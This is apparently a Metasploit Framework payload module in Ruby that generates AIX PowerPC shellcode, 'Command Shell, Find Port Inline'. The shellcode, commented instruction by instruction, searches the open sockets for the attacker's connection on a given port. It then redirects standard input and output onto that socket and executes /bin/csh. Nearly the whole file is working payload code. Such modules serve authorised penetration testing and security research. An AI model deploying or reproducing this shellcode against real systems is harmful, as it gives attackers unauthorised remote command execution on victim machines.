##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Payload::Aix
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::FindPort'

  #
  # Methods
  #

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'AIX Command Shell, Find Port Inline',
      'Description'   => 'Spawn a shell on an established connection',
      'Author'        => 'Ramon de C Valle',
      'License'       => MSF_LICENSE,
      'Platform'      => 'aix',
      'Arch'          => ARCH_PPC,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'CPORT' => [ 106, 'n' ],
            },
        }
      ))

  end

  def generate(*args)
    super(*args)

    payload =
    "\x7f\xff\xfa\x79"     +#   xor.    r31,r31,r31                #
    "\x40\x82\xff\xfd"     +#   bnel    <fndsockcode>              #
    "\x7f\xc8\x02\xa6"     +#   mflr    r30                        #
    "\x3b\xde\x01\xff"     +#   cal     r30,511(r30)               #
    "\x3b\xde\xfe\x1d"     +#   cal     r30,-483(r30)              #
    "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
    "\x4e\x80\x04\x20"     +#   bctr                               #
    "\x4c\xc6\x33\x42"     +#   crorc   6,6,6                      #
    "\x44\xff\xff\x02"     +#   svca    0                          #
    "\x3b\xde\xff\xf8"     +#   cal     r30,-8(r30)                #
    "\x3b\xa0\x07\xff"     +#   lil     r29,2047                   #
    "\x97\xe1\xff\xfc"     +#   stu     r31,-4(r1)                 #
    "\x7c\x3c\x0b\x78"     +#   mr      r28,r1                     #
    "\x3b\x7d\xf8\x2d"     +#   cal     r27,-2003(r29)             #
    "\x97\x61\xff\xfc"     +#   stu     r27,-4(r1)                 #
    "\x7c\x3b\x0b\x78"     +#   mr      r27,r1                     #
    "\x3b\xff\x01\xff"     +#   cal     r31,511(r31)               #
    "\x3b\xff\xfe\x02"     +#   cal     r31,-510(r31)              #
    "\x7f\x65\xdb\x78"     +#   mr      r5,r27                     #
    "\x7f\x84\xe3\x78"     +#   mr      r4,r28                     #
    "\x7f\xe3\xfb\x78"     +#   mr      r3,r31                     #
    @cal_getpeername +
    "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
    "\x4e\x80\x04\x21"     +#   bctrl                              #
    "\x3b\x5c\x01\xff"     +#   cal     r26,511(r28)               #
    "\xa3\x5a\xfe\x03"     +#   lhz     r26,-509(r26)              #
    "\x28\x1a\x11\x5c"     +#   cmpli   0,r26,4444                 #
    "\x40\x82\xff\xd4"     +#   bne     <fndsockcode+64>           #
    "\x3b\x3d\xf8\x03"     +#   cal     r25,-2045(r29)             #
    "\x7f\x23\xcb\x78"     +#   mr      r3,r25                     #
    @cal_close +
    "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
    "\x4e\x80\x04\x21"     +#   bctrl                              #
    "\x7f\x25\xcb\x78"     +#   mr      r5,r25                     #
    "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
    "\x7f\xe3\xfb\x78"     +#   mr      r3,r31                     #
    @cal_kfcntl +
    "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
    "\x4e\x80\x04\x21"     +#   bctrl                              #
    "\x37\x39\xff\xff"     +#   ai.     r25,r25,-1                 #
    "\x40\x80\xff\xd4"     +#   bge     <fndsockcode+116>          #
    "\x7c\xa5\x2a\x79"     +#   xor.    r5,r5,r5                   #
    "\x40\x82\xff\xfd"     +#   bnel    <fndsockcode+164>          #
    "\x7f\x08\x02\xa6"     +#   mflr    r24                        #
    "\x3b\x18\x01\xff"     +#   cal     r24,511(r24)               #
    "\x38\x78\xfe\x29"     +#   cal     r3,-471(r24)               #
    "\x98\xb8\xfe\x31"     +#   stb     r5,-463(r24)               #
    "\x94\xa1\xff\xfc"     +#   stu     r5,-4(r1)                  #
    "\x94\x61\xff\xfc"     +#   stu     r3,-4(r1)                  #
    "\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
    @cal_execve +
    "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
    "\x4e\x80\x04\x21"     +#   bctrl                              #
    "/bin/csh"

    # If the payload is generated and there are offsets to substitute,
    # do that now.
    if (payload and offsets)
      substitute_vars(payload, offsets)
    end

    payload
  end

end
